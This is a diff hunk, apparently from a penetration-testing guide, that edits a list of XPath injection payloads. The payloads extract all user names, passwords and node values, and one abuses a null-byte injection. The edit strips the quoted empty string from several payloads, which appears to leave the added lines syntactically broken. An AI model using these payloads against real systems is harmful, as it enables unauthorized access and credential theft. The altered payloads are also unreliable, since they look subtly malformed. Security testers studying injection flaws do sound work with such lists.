@@ -207,11 +207,11 @@ The output contains strings and the user can manipulate the values to search:<su
 
 ```
 ') or 1=1 or (' #Get all names
-') or 1=1] | //user/password[('')=(' #Get all names and passwords
-') or 2=1] | //user/node[('')=(' #Get all values
-')] | //./node[('')=(' #Get all values
-')] | //node[('')=(' #Get all values
-') or 1=1] | //user/password[('')=(' #Get all names and passwords
+') or 1=1] | //user/password[=(' #Get all names and passwords
+') or 2=1] | //user/node[=(' #Get all values
+')] | //./node[=(' #Get all values
+')] | //node[=(' #Get all values
+') or 1=1] | //user/password[=(' #Get all names and passwords
 ')] | //password%00 #All names and passwords (abusing null injection)
 ')]/../*[3][text!=(' #All the passwords
 ')] | //user/*[1] | a[(' #The ID of all users
